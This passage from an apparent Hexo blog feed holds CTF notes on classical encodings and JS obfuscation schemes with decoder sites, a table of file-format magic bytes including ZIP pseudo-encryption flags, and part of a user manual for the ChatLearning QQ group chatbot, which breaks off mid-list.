<li>中文摩斯加密解密：本工具摩尔密码加密是互联网上唯一一个可以对中文进行摩斯编码的工具。</li>
</ul>
<h4 id="莫尔斯电码加密列表-Morse-Code-List"><a href="#莫尔斯电码加密列表-Morse-Code-List" class="headerlink" title="莫尔斯电码加密列表 | Morse Code List"></a>莫尔斯电码加密列表 | Morse Code List</h4><h5 id="一、26个字母的莫尔斯电码加密"><a href="#一、26个字母的莫尔斯电码加密" class="headerlink" title="一、26个字母的莫尔斯电码加密"></a>一、26个字母的莫尔斯电码加密</h5><table>
<thead>
<tr>
<th align="left">字符</th>
<th align="left">电码符号</th>
<th align="left">字符</th>
<th align="left">电码符号</th>
<th align="left">字符</th>
<th align="left">电码符号</th>
<th align="left">字符</th>
<th align="left">电码符号</th>
</tr>
</thead>
<tbody><tr>
<td align="left">A</td>
<td align="left">．━</td>
<td align="left">B</td>
<td align="left">━ ．．．</td>
<td align="left">C</td>
<td align="left">━ ．━ ．</td>
<td align="left">D</td>
<td align="left">━ ．．</td>
</tr>
<tr>
<td align="left">E</td>
<td align="left">．</td>
<td align="left">F</td>
<td align="left">．．━ ．</td>
<td align="left">G</td>
<td align="left">━ ━ ．</td>
<td align="left">H</td>
<td align="left">．．．．</td>
</tr>
<tr>
<td align="left">I</td>
<td align="left">．．</td>
<td align="left">J</td>
<td align="left">．━ ━ ━</td>
<td align="left">K</td>
<td align="left">━ ．━</td>
<td align="left">L</td>
<td align="left">．━ ．．</td>
</tr>
<tr>
<td align="left">M</td>
<td align="left">━ ━</td>
<td align="left">N</td>
<td align="left">━ ．</td>
<td align="left">O</td>
<td align="left">━ ━ ━</td>
<td align="left">P</td>
<td align="left">．━ ━ ．</td>
</tr>
<tr>
<td align="left">Q</td>
<td align="left">━ ━ ．━</td>
<td align="left">R</td>
<td align="left">．━ ．</td>
<td align="left">S</td>
<td align="left">．．．</td>
<td align="left">T</td>
<td align="left">━</td>
</tr>
<tr>
<td align="left">U</td>
<td align="left">．．━</td>
<td align="left">V</td>
<td align="left">．．．━</td>
<td align="left">W</td>
<td align="left">．━ ━</td>
<td align="left">X</td>
<td align="left">━ ．．━</td>
</tr>
<tr>
<td align="left">Y</td>
<td align="left">━ ．━ ━</td>
<td align="left">Z</td>
<td align="left">━ ━ ．．</td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<h5 id="二、数字的莫尔斯电码加密"><a href="#二、数字的莫尔斯电码加密" class="headerlink" title="二、数字的莫尔斯电码加密"></a>二、数字的莫尔斯电码加密</h5><table>
<thead>
<tr>
<th align="left">字符</th>
<th align="left">电码符号</th>
<th align="left">字符</th>
<th align="left">电码符号</th>
<th align="left">字符</th>
<th align="left">电码符号</th>
<th align="left">字符</th>
<th align="left">电码符号</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0</td>
<td align="left">━ ━ ━ ━ ━</td>
<td align="left">1</td>
<td align="left">．━ ━ ━ ━</td>
<td align="left">2</td>
<td align="left">．．━ ━ ━</td>
<td align="left">3</td>
<td align="left">．．．━ ━</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">．．．．━</td>
<td align="left">5</td>
<td align="left">．．．．．</td>
<td align="left">6</td>
<td align="left">━ ．．．．</td>
<td align="left">7</td>
<td align="left">━ ━ ．．．</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left">━ ━ ━ ．．</td>
<td align="left">9</td>
<td align="left">━ ━ ━ ━ ．</td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<h5 id="三、标点符号的莫尔斯电码加密"><a href="#三、标点符号的莫尔斯电码加密" class="headerlink" title="三、标点符号的莫尔斯电码加密"></a>三、标点符号的莫尔斯电码加密</h5><table>
<thead>
<tr>
<th align="left">字符</th>
<th align="left">电码符号</th>
<th align="left">字符</th>
<th align="left">电码符号</th>
<th align="left">字符</th>
<th align="left">电码符号</th>
<th align="left">字符</th>
<th align="left">电码符号</th>
</tr>
</thead>
<tbody><tr>
<td align="left">.</td>
<td align="left">．━ ．━ ．━</td>
<td align="left">:</td>
<td align="left">━ ━ ━ ．．．</td>
<td align="left">,</td>
<td align="left">━ ━ ．．━ ━</td>
<td align="left">;</td>
<td align="left">━ ．━ ．━ ．</td>
</tr>
<tr>
<td align="left">?</td>
<td align="left">．．━ ━ ．．</td>
<td align="left">&#x3D;</td>
<td align="left">━ ．．．━</td>
<td align="left">’</td>
<td align="left">．━ ━ ━ ━ ．</td>
<td align="left">&#x2F;</td>
<td align="left">━ ．．━ ．</td>
</tr>
<tr>
<td align="left">!</td>
<td align="left">━ ．━ ．━ ━</td>
<td align="left">━</td>
<td align="left">━ ．．．．━</td>
<td align="left">_</td>
<td align="left">．．━ ━ ．━</td>
<td align="left">“</td>
<td align="left">．━ ．．━ ．</td>
</tr>
<tr>
<td align="left">(</td>
<td align="left">━ ．━ ━ ．</td>
<td align="left">)</td>
<td align="left">━ ．━ ━ ．━</td>
<td align="left">$</td>
<td align="left">．．．━ ．．━</td>
<td align="left">&amp;</td>
<td align="left">． ．．．</td>
</tr>
<tr>
<td align="left">@</td>
<td align="left">．━ ━ ．━ ．</td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<h3 id="常用解密网站：-8"><a href="#常用解密网站：-8" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p><a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://www.atool99.com/morse.php" >https://www.atool99.com/morse.php<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="6、Quoted-Printable"><a href="#6、Quoted-Printable" class="headerlink" title="6、Quoted-Printable"></a>6、Quoted-Printable</h2><p><strong>这种编码常用与邮件处理，只能对汉字进行编码，特征是&#x3D;加两个大写字母或数字组合</strong></p>
<h3 id="常用解密网站：-9"><a href="#常用解密网站：-9" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><ul>
<li><a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=http://www.mxcz.net/tools/QuotedPrintable.aspx" >http://www.mxcz.net/tools/QuotedPrintable.aspx<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<h2 id="7、ROT13"><a href="#7、ROT13" class="headerlink" title="7、ROT13"></a>7、ROT13</h2><p><strong>特征：它与凯撒密码差不多都是字母替换，你看到一句特别奇怪的语句可能就是它编码的</strong></p>
<p>ROT13（回转13位，Template:lang，有时中间加了个减号称作ROT-13）是一种简易的置换暗码。它是一种在网路论坛用作隐藏八卦（spoiler）、妙句、谜题解答以及某些脏话的工具，目的是逃过版主或管理员的匆匆一瞥。 ROT13被描述成「杂志字谜上下颠倒解答的Usenet对等体」（Usenet equivalent of a magazine printing the answer to a quiz upside down.）Template:cite web ROT13也是过去在古罗马开发的凯撒加密的一种变体。</p>
<h3 id="常用解密网站：-10"><a href="#常用解密网站：-10" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p><a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=http://www.mxcz.net/tools/rot13.aspx" >http://www.mxcz.net/tools/rot13.aspx<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="8、文本加密为汉字"><a href="#8、文本加密为汉字" class="headerlink" title="8、文本加密为汉字"></a>8、文本加密为汉字</h2><p><strong>特征：将明文加密成各种繁体字后面带俩等号</strong></p>
<p>它不仅可以加密成汉字，还可以加密成以下几种类型</p>
<p>汉字 数字 字母 音乐符号 国际标 盲文 韩文 日文 文 彝文 头符号 花朵符号 俄文</p>
<h3 id="常用解密网站：-11"><a href="#常用解密网站：-11" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p><a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://www.qqxiuzi.cn/bianma/wenbenjiami.php" >https://www.qqxiuzi.cn/bianma/wenbenjiami.php<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h1 id="js专用加密"><a href="#js专用加密" class="headerlink" title="js专用加密"></a>js专用加密</h1><h2 id="1、颜文字js加密"><a href="#1、颜文字js加密" class="headerlink" title="1、颜文字js加密"></a>1、颜文字js加密</h2><p><strong>特征：一堆颜文字构成的js代码，在F12中可直接解密执行</strong></p>
<h3 id="常用解密网站：-12"><a href="#常用解密网站：-12" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p><a class="link"   href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://utf-8.jp/public/aaencode.html" >https://utf-8.jp/public/aaencode.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="2、jother编码"><a href="#2、jother编码" class="headerlink" title="2、jother编码"></a>2、jother编码</h2><p><strong>特征：只用<code>! + ( ) [ ] &#123; &#125;</code>这八个字符就能完成对任意字符串的编码。也可在F12中解密执行</strong></p>
<h3 id="常用解密网站：-13"><a href="#常用解密网站：-13" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p><a class="link"   href="http://tmxk.org/jother/" >http://tmxk.org/jother/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="3、JSFuck编码"><a href="#3、JSFuck编码" class="headerlink" title="3、JSFuck编码"></a>3、JSFuck编码</h2><p><strong>特征：与jother很像，只是少了<code>&#123; &#125;</code></strong></p>
<h3 id="常用解密网站：-14"><a href="#常用解密网站：-14" class="headerlink" title="常用解密网站："></a><strong>常用解密网站：</strong></h3><p><a class="link"   href="https://jsfuck.com/" >https://jsfuck.com/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF文件头文件尾汇总</title>
    <url>/posts/4db76617.html</url>
    <content><![CDATA[<blockquote>
<p>转自<a class="link"   href="https://blog.csdn.net/Ahuuua/article/details/109165473#/" >https://blog.csdn.net/Ahuuua/article/details/109165473#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<p>文件头文件尾汇总：</p>
<table>
<thead>
<tr>
<th>文件类型</th>
<th>文件头</th>
<th>文件尾</th>
<th>特征</th>
</tr>
</thead>
<tbody><tr>
<td>JPEG (jpg)</td>
<td>FFD8FF</td>
<td>FF D9</td>
<td>ÿØÿà</td>
</tr>
<tr>
<td>PNG (png)</td>
<td>89504E47</td>
<td>AE 42 60 82</td>
<td>.PNG…</td>
</tr>
<tr>
<td>GIF (gif)</td>
<td>47494638</td>
<td>00 3B</td>
<td>GIF89a</td>
</tr>
<tr>
<td>ZIP Archive (zip)</td>
<td>504B0304</td>
<td>50 4B</td>
<td>PK..</td>
</tr>
<tr>
<td>TIFF (tif)</td>
<td>49492A00</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Windows Bitmap (bmp)</td>
<td>424D</td>
<td></td>
<td>BM</td>
</tr>
<tr>
<td>RAR Archive (rar)</td>
<td>52617221</td>
<td></td>
<td>Rar!…</td>
</tr>
<tr>
<td>Wave (wav)</td>
<td>57415645</td>
<td></td>
<td></td>
</tr>
<tr>
<td>AVI (avi)</td>
<td>41564920</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MPEG (mpg)包含音频数据和视频数据</td>
<td>000001BA</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MPEG (mpg)只包含视频数据</td>
<td>000001B3</td>
<td></td>
<td></td>
</tr>
<tr>
<td>7Z</td>
<td>377ABCAF271C</td>
<td></td>
<td>7z¼¯’</td>
</tr>
<tr>
<td>CAD (dwg)</td>
<td>41433130</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Adobe Photoshop (psd)</td>
<td>38425053</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Rich Text Format (rtf)</td>
<td>7B5C727466</td>
<td></td>
<td></td>
</tr>
<tr>
<td>XML (xml)</td>
<td>3C3F786D6C</td>
<td></td>
<td></td>
</tr>
<tr>
<td>HTML (html)</td>
<td>68746D6C3E</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Email [thorough only] (eml)</td>
<td>44656C69766572792D646174653A</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Outlook Express (dbx)</td>
<td>CFAD12FEC5FD746F</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Outlook (pst)</td>
<td>2142444E</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS Word&#x2F;Excel (xls.or.doc)</td>
<td>D0CF11E0</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS Access (mdb)</td>
<td>5374616E64617264204A</td>
<td></td>
<td></td>
</tr>
<tr>
<td>WordPerfect(wpd)</td>
<td>FF575043</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Adobe Acrobat (pdf)</td>
<td>255044462D312E</td>
<td></td>
<td>%PDF</td>
</tr>
<tr>
<td>Quicken (qdf)</td>
<td>AC9EBD8F</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Windows Password (pwl)</td>
<td>E3828596</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Real Audio (ram)</td>
<td>2E7261FD</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Real Media (rm)</td>
<td>2E524D46</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Quicktime (mov)</td>
<td>6D6F6F76</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Windows Media (asf)</td>
<td>3026B2758E66CF11</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MIDI (mid)</td>
<td>4D546864</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Win PE</td>
<td>4D5A</td>
<td></td>
<td>MZ</td>
</tr>
<tr>
<td>ELF</td>
<td>7F 45 4C 46</td>
<td></td>
<td>.ELF</td>
</tr>
<tr>
<td>VMDK</td>
<td>4B 44 4D</td>
<td></td>
<td>KDM</td>
</tr>
<tr>
<td>Java-class</td>
<td>CA FE BA BE</td>
<td></td>
<td>Êþº¾</td>
</tr>
</tbody></table>
<p>另外附一些小知识：</p>
<h2 id="PNG-png"><a href="#PNG-png" class="headerlink" title="PNG (png)"></a>PNG (png)</h2><p>摘于：<a class="link"   href="https://blog.csdn.net/bisword/article/details/2777121" >https://blog.csdn.net/bisword/article/details/2777121<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>文件头：89504E47　　　　　　　　　　　　　　　　　　　　　　文件尾：AE 42 60 82<br>PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：00 00 00 00 49 45 4E 44 AE 42 60 82<br>不难明白，由于数据块结构的定义，IEND数据块的长度总是0（00 00 00 00，除非人为加入信息），数据标识总是IEND（49 45 4E 44），因此，CRC码也总是AE 42 60 82。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/file-header/20201019175155622.png"
                      alt="img"
                ><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/file-header/20201019175206371.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/file-header/1.png"
                      alt="img"
                ></p>
<p>给大家举个例子：</p>
<p>PNG图像：321*332分辨率  321-&gt;00 00 01 41  332-&gt;00 00 01 4C (也可以搜索十六进制找到标志位)</p>
<p>也可以根据位直接找到标志位，就是IHDR的后面4字节00 00 01 41为宽度 再后4字节00 00 01 4C为长度</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/file-header/20201019175441812.png"
                      alt="img"
                ></p>
<p> 89 50 4E 47 0D 0A 1A 0A 是PNG头部署名域，表示这是一个PNG图片<br>00 00 00 0D 描述IHDR头部的大小。</p>
<h2 id="zip文件"><a href="#zip文件" class="headerlink" title="zip文件"></a>zip文件</h2><p>摘于：<a class="link"   href="https://blog.csdn.net/qq_26187985/article/details/83654197" >https://blog.csdn.net/qq_26187985/article/details/83654197<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>压缩源文件数据区：<br>50 4B 03 04：这是头文件标记<br>压缩源文件目录区：<br>50 4B 01 02：目录中文件文件头标记<br>压缩源文件目录结束标志：<br>50 4B 05 06：目录结束标记</p>
<p>无加密<br>压缩源文件数据区的全局加密应当为00 00  （504B0304两个bytes之后）4位二进制数&lt;&#x3D;&gt;1位十六进制数 16bit&lt;&#x3D;&gt;4位16进制<br>且压缩源文件目录区的全局方式位标记应当为00 00（504B0304四个bytes之后）<br>一个字节表示两个16进制数</p>
<p>假加密<br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p>
<p>真加密<br>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/file-header/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FodXV1YQ==,size_16,color_FFFFFF,t_70"
                      alt="img"
                ></p>
<p>全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性！<br>第二个数字为奇数时 –&gt;加密<br>第二个数字为偶数时 –&gt;未加密<br>意思是08 00也是未加密 可以改为00 02 04 06 08<br>改为01 03 05 07 09会被加密</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Misc</tag>
      </tags>
  </entry>
  <entry>
    <title>ChatLearning————学群友说话使用手册</title>
    <url>/posts/edeaa258.html</url>
    <content><![CDATA[<h2 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h2><ul>
<li><a class="link"   href="https://github.com/project-mirai/mirai-api-http" >mirai-api-http<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 配置 <code>http adapter</code> ， <code>singleMode</code> 为 <code>false</code> 为了保证稳定性，请尽量使用mirai-api-http v2.3.3版本</li>
<li>配置 <code>data.json</code></li>
</ul>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"> <span class="attr">&quot;Key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xxxxx&quot;</span><span class="punctuation">,</span> <span class="comment">// 在mirai-api-http中设置的密钥,若使用singleMode也不需要校验,设置为&quot;&quot;即可</span></span><br><span class="line"> <span class="attr">&quot;host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span> <span class="comment">// mirai-api-http中设置的地址（若设置成0.0.0.0，请填写127.0.0.1）</span></span><br><span class="line"> <span class="attr">&quot;port&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8080&quot;</span><span class="punctuation">,</span> <span class="comment">// mirai-api-http中设置的端口</span></span><br><span class="line"> <span class="attr">&quot;qq&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xxx&quot;</span><span class="punctuation">,</span>  <span class="comment">// 在mirai登陆的QQ号</span></span><br><span class="line"> <span class="attr">&quot;session&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xxx&quot;</span> <span class="comment">// 无需修改</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>Windows双击 <code>ChatLearning.exe</code> 直接运行</li>
<li>Linux在<code>cd</code>到目录后使用<code>./ChatLearning</code>运行</li>
<li>Win7或以下的32位系统(包括32位的Linux)则需下载<strong>Source包</strong>并确保Python版本≥3.6使用 <code>pip install -r requirements.txt</code> 安装依赖后运行 <code>Chatmain.py</code></li>
</ul>
<blockquote>
<p>首次使用在控制台使用 <code>setadmin &lt;QQ号,多个请用空格隔开&gt;</code> 设置管理员； <code>blackfreq &lt;次数&gt;</code> 设置黑名单容错次数</p>
</blockquote>
<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>控制台下可执行指令，发送 <code>help</code> 获取指令表；管理员在聊天环境下私聊bot执行指令时，加上指令前缀 <code>！</code> 或 <code>!</code></p>
<table>
<thead>
<tr>
<th align="left">基本</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>help</code></td>
<td align="left">指令表</td>
</tr>
<tr>
<td align="left"><code>check</code></td>
<td align="left">查看词库的问答个数和属性设置</td>
</tr>
<tr>
<td align="left"><code>admin</code></td>
<td align="left">进入管理模式</td>
</tr>
<tr>
<td align="left"><code>learning </code></td>
<td align="left">开启&#x2F;关闭记录</td>
</tr>
<tr>
<td align="left"><code>reply</code></td>
<td align="left">开启&#x2F;关闭回复</td>
</tr>
<tr>
<td align="left"><code>voicereply</code></td>
<td align="left">开启&#x2F;关闭文字转语音回复</td>
</tr>
<tr>
<td align="left"><code>setadmin  &lt;QQ&gt;</code></td>
<td align="left">设置管理员QQ号，有多个用空格隔开</td>
</tr>
</tbody></table>
<hr>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>globe</code></td>
<td align="left">开启&#x2F;关闭总词库</td>
</tr>
<tr>
<td align="left"><code>cosmatch</code></td>
<td align="left">开启&#x2F;关闭问题余弦相似度计算</td>
</tr>
<tr>
<td align="left"><code>cosmatch &lt;匹配率&gt;</code></td>
<td align="left">设定问题余弦相似度计算匹配率阈值</td>
</tr>
<tr>
<td align="left"><code>blackfreq &lt;次数&gt;</code></td>
<td align="left">设置黑名单容错次数</td>
</tr>
<tr>
<td align="left"><code>merge &lt;单位/秒&gt;</code></td>
<td align="left">间隔多长时间合成一次总词库</td>
</tr>
<tr>
<td align="left"><code>learning &lt;单位/秒&gt;</code></td>
<td align="left">词库链间隔时间</td>
</tr>
<tr>
<td align="left"><code>typefreq &lt;消息类型&gt; &lt;次数&gt;</code></td>
<td align="left">为消息类型设置回复阈值</td>
</tr>
<tr>
<td align="left"><code>voicereply</code></td>
<td align="left">开启&#x2F;关闭文字转语音回复</td>
</tr>
<tr>
<td align="left"><code>reply &lt;百分比&gt;</code></td>
<td align="left">回复概率，若没有触发也不会触发文字转语音</td>
</tr>
<tr>
<td align="left"><code>replywait &lt;基准时间&gt; &lt;浮动时间&gt;</code></td>
<td align="left">设置回复时的等待时间（基准时间±浮动时间）</td>
</tr>
<tr>
<td align="left"><code>replycd &lt;秒&gt;</code></td>
<td align="left">设置回复的冷却时间</td>
</tr>
<tr>
<td align="left"><code>voicereply  &lt;百分比&gt;</code></td>
<td align="left">文字转语音概率，若没有触发将会继续发送文字</td>
</tr>
</tbody></table>
<ul>
<li>回复阈值：Bot获取到答案时，需要这个答案在词库中<strong>重复出现</strong>的次数<strong>大于或者等于这个阈值</strong>时，才会回复</li>
<li>黑名单容错次数：根据你设置的敏感词，达到次数自动将对象拉入黑名单后，不记录此人所有的发言。</li>
<li>全局模式：未启用全局模式时，每个群的词库独立且实时生效（分群词库），上一秒从群中收集到一个词，下一秒就可以在本群中回复这个词。开启全局模式后，bot将采用由所有分群词库定时合成的总词库回复</li>
<li>词库链间隔时间：发消息后多长时间会进入空窗期，比如设置10s，一个人发完一条消息10s内没人继续说话，就会将10s后的第一条消息作为问，再下一条就是答，可能没什么卵用，毕竟群里经常上话不接下话，不在一个频道。</li>
<li>问题余弦相似度计算：当词库中无该问题时，会启用相似度计算引擎，会将问题与词库中所有的问题进行相似度计算，选取匹配率最高的进行回答（该阈值可设定），较消耗计算机资源，斟酌开启</li>
</ul>
<table>
<thead>
<tr>
<th align="left">群部分</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>grouplist</code></td>
<td align="left">查看开启记录&#x2F;回复的群列表</td>
</tr>
<tr>
<td align="left"><code>add/remove learning &lt;群号&gt;</code></td>
<td align="left">添加&#x2F;移除开启记录的群，有多个用空格隔开</td>
</tr>
<tr>
<td align="left"><code>add/remove learnings &lt;群号&gt;</code></td>
<td align="left">同时添加&#x2F;移除开启记录和回复的群，有多个用空格隔开</td>
</tr>
<tr>
<td align="left"><code>add/remove reply &lt;群号&gt;</code></td>
<td align="left">添加&#x2F;移除开启回复的群，有多个用空格隔开</td>
</tr>
<tr>
<td align="left"><code>add/remove tag &lt;标签&gt; &lt;群号&gt;</code></td>
<td align="left">添加&#x2F;移除群标签(移除时不需要带上标签参数)</td>
</tr>
<tr>
<td align="left"><code>add/remove subadmin &lt;群号&gt;</code></td>
<td align="left">添加&#x2F;移除可自行管理本群词库的群，有多个用空格隔开</td>
</tr>
<tr>
<td align="left"><code>add/remove unmerge &lt;群号&gt;</code></td>
<td align="left">添加&#x2F;移除不录入总词库的群，有多个用空格隔开</td>
</tr>
</tbody></table>
<ul>
<li>群标签：群往往带有一些<strong>属性</strong>，例如xxx游戏群，xxx交流群，这时候可以为群添加相应的标签，在记录词库时，会<strong>记录在相应标签的词库</strong>内，这样在回复时，只会在<strong>相应标签词库内寻找答案</strong>，一个群可以拥有<strong>多个标签，支持中文</strong></li>
</ul>
<table>
<thead>
<tr>
<th align="left">文字转语音</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>setvoicept  &lt;训练集&gt;</code></td>
<td align="left">选择音源合成时的训练模型</td>
</tr>
<tr>
<td align="left"><code>uploadwav</code></td>
<td align="left">上传音源文件</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="left">快速删除</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>fastdelete</code></td>
<td align="left">更改快速删除功能的使用权限</td>
</tr>
<tr>
<td align="left"><code>settemp</code> &lt;条数&gt;</td>
<td align="left">设置单个群中消息缓存最大数目</td>
</tr>
</tbody></table>
<ul>
<li>&#96;快速删除：在开启回复的群中，向Bot所发送的消息回复<code>!d</code> 、<code>!delete</code> 、<code>！d</code> 、<code>！delete</code> 即可在词库中删除该回复</li>
</ul>
<table>
<thead>
<tr>
<th align="left">定时任务</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>add/remove autotask &lt;任务名称&gt;</code></td>
<td align="left">添加&#x2F;移除定时任务</td>
</tr>
<tr>
<td align="left"><code>autotaskinfo</code></td>
<td align="left">查看定时任务详情</td>
</tr>
<tr>
<td align="left"><code>autotaskcommand</code></td>
<td align="left">查看定时任务中的特殊指令</td>
</tr>
</tbody></table>
<h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><hr>
<p><strong>ChatLearning</strong>在2.9.5版本中加入了定时任务功能，可以自定义地定时执行<strong>ChatLearning</strong>中的指令</p>
<p><strong>注：若发现输入正确却无法解析内容，请检查txt文件编码是否为UTF-8</strong></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;这是一个定时任务的模板，程序会自动解析带标记的行&#x27;&#x27;&#x27;</span><br><span class="line">&#x27;&#x27;&#x27;请创建一个新的txt文件放置AutoTask文件夹下来自定义你的任务，文件名即是任务名&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;开头使用&quot;#&quot;来标记任务的执行日期&#x27;&#x27;</span><br><span class="line">如&quot;每日&quot;：</span><br><span class="line">#everyday</span><br><span class="line">或是&quot;周一 周日&quot;：</span><br><span class="line">#w1 w7</span><br><span class="line">还可以是&quot;每2天&quot;:</span><br><span class="line">#x2</span><br><span class="line">亦或是&quot;具体日期&quot;(不足十位请补0，如5→05)：</span><br><span class="line">#2022-08-30</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;开头使用&quot;@&quot;来标记执行结果发送的QQ号&#x27;&#x27;</span><br><span class="line">如：</span><br><span class="line">@123456</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;开头使用&quot;*&quot;来标记任务的执行时间&#x27;&#x27;</span><br><span class="line">如(请使用英文冒号哦，不足十位请补0，如5→05)：</span><br><span class="line">*05:05</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;开头使用&quot;/&quot;来标记任务所需执行的指令&#x27;&#x27;</span><br><span class="line">如(一个指令对应一行)：</span><br><span class="line">/check</span><br><span class="line">/autodelete</span><br><span class="line"></span><br><span class="line">以下是示例（每天的12点和23点59分，按顺序执行check，grouplist指令，并将结果发送给123456）：</span><br><span class="line">#everyday</span><br><span class="line">@123456</span><br><span class="line">*12:00 23:59</span><br><span class="line">/check</span><br><span class="line">/grouplist</span><br><span class="line"></span><br><span class="line">-------------------</span><br><span class="line">在自动任务中有一些特殊指令：</span><br><span class="line">自动清理词库&quot;autodelete&quot;</span><br><span class="line">发送群消息&quot;sendgroupmessage &lt;群号&gt; &lt;消息&gt;&quot;</span><br><span class="line">发送群图片&quot;sendgroupmessageimage &lt;群号&gt; &lt;图片文件的绝对路径&gt;&quot;</span><br><span class="line">发送好友消息&quot;sendfriendmessage &lt;好友QQ&gt; &lt;消息&gt;&quot;</span><br><span class="line">发送好友图片&quot;sendfriendmessageimage &lt;好友QQ&gt; &lt;图片文件的绝对路径&gt;&quot;</span><br><span 